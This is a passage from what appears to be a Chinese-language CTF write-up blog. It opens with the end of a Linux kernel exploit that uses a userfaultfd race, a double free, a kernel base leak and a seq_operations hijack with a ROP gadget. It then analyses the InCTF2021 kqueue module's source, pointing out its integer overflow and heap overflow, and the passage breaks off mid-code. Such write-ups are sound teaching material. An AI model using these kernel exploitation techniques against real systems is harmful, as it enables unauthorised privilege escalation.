class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel base    </span></span><br><span class="line">    push(uffd_buf_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for double free</span></span><br><span class="line">    uffd_buf_uaf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct the double free</span></span><br><span class="line">    push(<span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    pop(uffd_buf_uaf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for hijack</span></span><br><span class="line">    uffd_buf_hack = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, <span class="number">0xffffffff814d51c0</span> + kernel_offset);</span><br><span class="line">    *(<span class="type">size_t</span> *)(uffd_buf_hack + page_size - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;    <span class="comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h3><ol><li>注册userfaultfd的过程中可能会用到一些object,因此为了避免其影响,可以<strong>尽量早</strong>的完成注册</li><li>构造double free之后,两次申请出同一个object会破坏slab,从而导致后续如果使用到了该slab会发生错误,为了避免这种情况,我们可以提前申请合适数目的obj,然后在double free之后将其释放,以此修复slab链</li></ol><h2 id="InCTF2021-kqueue"><a href="#InCTF2021-kqueue" class="headerlink" title="InCTF2021-kqueue"></a>InCTF2021-kqueue</h2><h3 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m <span class="number">512</span> \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure><p>kpti和smap,smep都没开启,只有一个kaslr,这样就可以ret2usr了</p><h3 id="模块-2"><a href="#模块-2" class="headerlink" title="模块"></a>模块</h3><p>题目直接给出了模块的源码,那就不需要逆向了</p><p>只注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">kqueue_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="type">void</span> *)&amp;request, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且有加锁</p><p>要传入的结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br></pre></td></tr></table></figure><p>此外还定义了一个err函数,在检查不通过时便会调用,但实际上不通过也不会有任何问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">err</span><span class="params">(<span class="type">char</span>* msg)</span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>create_kqueue</strong></p><p>主要是进行队列的创建，限制了队列数量与大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="type">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="type">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="type">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中一个 queue 结构体定义如下，大小为 0x18：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint64_t</span> queue_size; <span class="comment">/* This needs to handle larger numbers */</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure><p>有一个全局指针数组保存分配的 queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="built_in">queue</span> *)<span class="literal">NULL</span>&#125;;</span><br></pre></td></tr></table></figure><p>在这里用到了 <a href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc 内置函数</a> <code>__builtin_umulll_overflow</code>，主要作用就是将前两个参数相乘给到第三个参数，发生溢出则返回 true，<code>__builtin_saddll_overflow</code> 与之类似不过是加法</p><p>那么这里虽然 queue 结构体的成员数量似乎是固定的，但是在 kmalloc 时传入的 size 为 <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>，其剩余的空间用作 queue_entry 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    queue_entry *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里存在一个<strong>整型溢出漏洞</strong>：如果在 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 中我们传入的 <code>request.max_entries</code> 为 <code>0xffffffff</code>，加一后变为0，此时便能通过检测，但 space 最终的结果为0，从而在后续进行 kmalloc 时便只分配了一个 queue 的大小，但是存放到 queue 的 max_entries 域的值为 <code>request.max_entries</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line"><span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line"><span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br></pre></td></tr></table></figure><p>在分配 queue-&gt;data 时给 kmalloc 传入的大小为 <code>request.data_size</code>，限制为 0x20</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br></pre></td></tr></table></figure><p>接下来会为每一个 queue_entry 的 data 域都分配一块内存，大小为 <code>request.data_size</code>，且 queue_entry 从低地址向高地址连接成一个单向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在最后会在 kqueue 数组中找一个空的位置把分配的 queue 指针放进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">    err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">queueCount++;</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p><strong>delete_kqueue</strong></p><p>常规的删除功能，不过这里有个 bug 是先释放后再清零，笔者认为会把 free object 的next 指针给清掉，有可能导致内存泄漏？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>edit_kqueue</strong></p><p>主要是从用户空间拷贝数据到指定 queue_entry-&gt;size，如果给的 entry_idx为 0 则拷到 queue-&gt;data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the kqueue exists at that idx */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue entry */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the kqueue entry memory */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for the existence of the kqueue entry */</span></span><br><span class="line">    exists = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="built_in">queue</span>-&gt;max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If kqueue entry found , do the necessary */</span></span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">            <span class="keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class="line">                validate(<span class="built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">                exists = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx==<span class="number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(<span class="built_in">queue</span>-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!exists)</span><br><span class="line">        <span class="keyword">return</span> NOT_EXISTS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>save_kqueue_entries</strong></p><p>这个功能主要是分配一块现有 <code>queue-&gt;queue_size</code> 大小的 object 然后把 queue-&gt;data 与其所有 queue_entries-&gt;data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 <code>request.data_size</code> ，在这里很明显存在堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 